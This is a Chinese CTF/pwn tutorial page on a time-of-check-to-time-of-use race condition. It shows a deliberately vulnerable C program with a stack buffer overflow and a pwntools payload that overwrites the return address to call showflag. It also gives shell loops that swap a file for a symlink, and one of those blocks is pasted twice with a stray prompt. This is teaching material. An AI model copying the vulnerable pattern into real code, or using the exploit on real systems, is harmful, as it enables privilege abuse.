---
title: Race Condition
date:   2020-07-20 09:14:37
updated: 2020-07-20 09:14:37
tags:
    - 条件竞争漏洞
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---

# 1.原理

参考seed的实验

<div class="btn-center">
{% btn 'http://zhixia.xyz/2020/06/29/seed/',seed,far fa-hand-point-right,outline orange larger %}
</div>

# 2.例子

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
void showflag() { system("cat flag"); }
void vuln(char *file, char *buf) {
  int number;
  int index = 0;
  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open file failed!!");
    return;
  }
  while (1) {
    number = read(fd, buf + index, 128);
    if (number <= 0) {
      break;
    }
    index += number;
  }
  buf[index + 1] = '\x00';
}
void check(char *file) {
  struct stat tmp;
  if (strcmp(file, "flag") == 0) {
    puts("file can not be flag!!");
    exit(0);
  }
  stat(file, &tmp);
  if (tmp.st_size > 255) {
    puts("file size is too large!!");
    exit(0);
  }
}
int main(int argc, char *argv[argc]) {
  char buf[256];
  if (argc == 2) {
    check(argv[1]);
    vuln(argv[1], buf);
  } else {
    puts("Usage ./prog <filename>");
  }
  return 0;
}
```

可以看出程序的基本流程如下

- 检查传入的命令行参数是不是 “flag”，如果是的话，就退出。
- 检查传入的命令行参数对应的文件大小是否大于 255，是的话，就直接退出。
- 将命令行参数所对应的文件内容读入到 buf 中 ，buf 的大小为 256。

看似我们检查了文件的大小，同时 buf 的大小也可以满足对应的最大大小，但是这里存在一个条件竞争的问题。

如果我们在程序检查完对应的文件大小后，将对应的文件删除，并符号链接到另外一个更大的文件，那么程序所读入的内容就会更多，从而就会产生栈溢出。

那么，基本思路来了，我们是想要获得对应的`flag`的内容。那么我们只要通过栈溢出修改对应的`main`函数的返回地址即可，通过反汇编以及调试可以获得`showflag`的地址，获得对应的 payload

```python

from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
#payload.py
```

exp.sh

```bash
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
```

run.sh

```bash
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
➜  racetest cat run.sh 
#!/bin/sh
for i in `seq 1000`
do
    ./test fake
done
```

ln -s 软链接

seq 用于产生从某个数到另外一个数之间的所有整数

![image.png](https://i.loli.net/2020/11/17/IbtvXou9qyYDmfZ.png)